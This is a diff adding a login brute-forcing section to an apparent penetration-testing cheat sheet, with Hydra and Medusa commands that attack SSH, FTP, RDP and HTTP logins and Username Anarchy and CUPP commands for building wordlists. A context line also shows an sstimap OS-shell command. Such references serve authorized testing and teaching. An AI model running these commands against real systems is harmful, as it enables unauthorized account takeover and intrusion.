@@ -1053,6 +1053,44 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 #17. - Login Brute Forcing
 -----------------------------------------
 
+- Hydra
+
+```
+$ hydra -l admin -P <password_file> ftp://192.168.1.100
+$ hydra -l root -P <password_file> ssh://192.168.1.100
+$ hydra -l admin -P <password_file> 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+```
+
+- Medusa
+
+```
+$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
+$ medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
+$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
+$ medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET
+$ medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
+```
+
+- Username Anarchy
+
+```
+$ username-anarchy Jane Smith
+$ username-anarchy -i names.txt
+$ username-anarchy -a --country us
+$ username-anarchy -l
+$ username-anarchy -f format1,format2
+$ username-anarchy -@ example.com
+$ username-anarchy --case-insensitive
+```
+
+- CUPP (Common User Passwords Profiler)
+
+```
+$ cupp -i
+$ cupp -w profiles.txt
+$ cupp -l
+```
+
 #18. - Sensitive Data Exposure
 -----------------------------------------
 
